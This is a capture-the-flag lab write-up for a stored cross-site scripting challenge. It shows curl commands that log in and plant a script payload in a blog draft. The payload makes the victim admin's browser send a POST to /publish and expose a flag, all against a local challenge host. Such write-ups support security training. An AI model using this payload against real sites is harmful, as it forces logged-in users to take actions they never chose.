# Cross Site Scripting 6

In this challenge, we have `/challenge/server` that will server us a blog post web app. There is a `/challenge/victim`
that will act as the victim.

Similar to the previous challenge, our method to attack is by making the `/challenge/victim` run arbritrary javascript stored in the
database, that will make the `admin` direct themselves to the `/publish` endpoint and publish their flag, that's currently drafted.

This time, the `/publish` endpoint is a POST endpoint instead of a GET. Luckily, `fetch()` handles POST endpoints as well, by doing this:

```javascript
fetch("/publish", {method: "POST"})
```

Therefore, we can login using the same `curl` command as last time:

```bash
curl -c cookies.txt 'challenge.localhost:80/login' -d "username=hacker" -d "password=1337" -L
```

And then we can use this command for our payload:

```bash
curl -b cookies.txt 'challenge.localhost:80/draft?' -d 'content=<script>fetch("/publish", {method: "POST"})</script>' -d 'publish=1' -L
```

And there, you go! The blog post now has the full flag! This was very similar to the `xss-5` and just wanted us to understand that `fetch()`
can also send requests to `POST` endpoints as well.